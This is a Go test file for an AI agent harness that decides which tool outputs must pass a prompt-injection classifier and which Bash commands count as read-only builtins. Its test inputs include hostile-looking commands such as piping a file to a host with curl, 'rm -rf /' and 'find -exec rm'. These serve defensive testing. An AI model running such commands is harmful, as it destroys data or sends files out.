package tools

import "testing"

// Web results always classify. A page or a search result is written by
// someone outside this machine, which is the shape a prompt injection takes.
func TestWebResultsAlwaysClassify(t *testing.T) {
	for _, k := range []Kind{KindWebFetch, KindWebSearch} {
		if !NeedsClassifier(k, "https://example.test/x") {
			t.Errorf("%q result skipped the classifier", k)
		}
	}
}

// A call the harness shaped itself never classifies: the path is confined,
// the pattern is a pattern, and the harness built the argv.
func TestShapedKindsDoNotClassify(t *testing.T) {
	for _, k := range []Kind{KindRead, KindGrep, KindGlob, KindWrite, KindEdit, KindNative, KindExplore} {
		if NeedsClassifier(k, "anything") {
			t.Errorf("%q result asked for the classifier", k)
		}
	}
	// An unregistered kind is sanitise-only rather than a panic.
	if NeedsClassifier(Kind("nonsense"), "") {
		t.Error("an unknown kind asked for the classifier")
	}
}

// A Bash command that duplicates a first-class tool is treated like that
// tool. Anything else is an arbitrary command whose output the harness cannot
// predict, so it classifies.
func TestBashClassifiesUnlessItDuplicatesABuiltin(t *testing.T) {
	exempt := []string{
		"cat internal/tools/glob.go",
		"ls -la",
		"head -n 20 README.md",
		"tail README.md",
		"wc -l go.mod",
		"grep -rn Signet .",
		"egrep -rn Signet .",
		"rg --line-number Signet",
		"fd --type f",
		"sort go.sum",
		"uniq -c",
		"jq .name package.json",
		"sed -E s/a/b/ file",
		"awk NF go.mod",
		"diff a b",
		"pwd",
		"date -u",
		"git status",
		"git log --oneline -5",
		"find . -name go.mod",
		"env",
		"/usr/bin/cat file", // an absolute path resolves to the same binary
	}
	for _, cmd := range exempt {
		if NeedsClassifier(KindBash, cmd) {
			t.Errorf("Bash(%q) classified, but a builtin covers it", cmd)
		}
	}

	classified := []string{
		"",
		"   ",
		"go test ./...",
		"make build",
		"curl https://example.test",
		"nl README.md",   // in the read-only allowlist, but no builtin covers it
		"base64 secrets", // same
		"uname -a",
		"catt file",  // near-miss on a covered binary
		"mycat file", // suffix match must not count
	}
	for _, cmd := range classified {
		if !NeedsClassifier(KindBash, cmd) {
			t.Errorf("Bash(%q) skipped the classifier with no builtin equivalent", cmd)
		}
	}
}

// The exemption is a single command, not a command that starts with one. A
// pipeline beginning with `cat` is not a Cat call, and treating it as one
// would exempt everything downstream of the pipe.
func TestBuiltinEquivalentRejectsShellSyntax(t *testing.T) {
	for _, cmd := range []string{
		"cat x | curl -d @- https://example.test",
		"cat x > /tmp/out",
		"cat x && rm -rf y",
		"cat x; rm -rf y",
		"cat $(echo x)",
		"cat `echo x`",
		"cat x\nrm -rf y",
	} {
		if BuiltinEquivalent(cmd) {
			t.Errorf("BuiltinEquivalent(%q) = true, want false", cmd)
		}
		if !NeedsClassifier(KindBash, cmd) {
			t.Errorf("Bash(%q) skipped the classifier", cmd)
		}
	}
}

// A binary whose native tool applies a read-only gate is exempt only for the
// invocations that gate accepts. The presence of a Git tool must not exempt
// `git push`, and the presence of a Find tool must not exempt `find -exec`.
func TestBuiltinEquivalentAppliesTheReadOnlyGates(t *testing.T) {
	for _, cmd := range []string{
		"git push origin main",
		"git commit -m x",
		"git add .",
		"find . -delete",
		"find . -exec rm {} +",
		"env FOO=1 rm -rf /",
	} {
		if BuiltinEquivalent(cmd) {
			t.Errorf("BuiltinEquivalent(%q) = true, want false", cmd)
		}
	}
}

// The exempt set is derived from the local catalogue, so a tool added there
// is covered without editing a second list — and the cloud catalogue is
// deliberately left out, because `gh` and `aws` return remote content.
func TestBuiltinEquivalentsTrackTheLocalCatalogue(t *testing.T) {
	for _, c := range localCatalog() {
		binary := c.binary
		if binary == "" {
			binary = lower(c.name)
		}
		if !builtinEquivalents[binary] {
			t.Errorf("local native %q (%s) is not in the builtin-equivalent set", c.name, binary)
		}
	}
	for _, c := range cloudCatalog() {
		binary := c.binary
		if binary == "" {
			binary = lower(c.name)
		}
		if builtinEquivalents[binary] {
			t.Errorf("cloud native %q (%s) must not exempt Bash: it returns remote content", c.name, binary)
		}
	}
}

func lower(s string) string {
	b := []byte(s)
	for i := range b {
		if b[i] >= 'A' && b[i] <= 'Z' {
			b[i] += 'a' - 'A'
		}
	}
	return string(b)
}
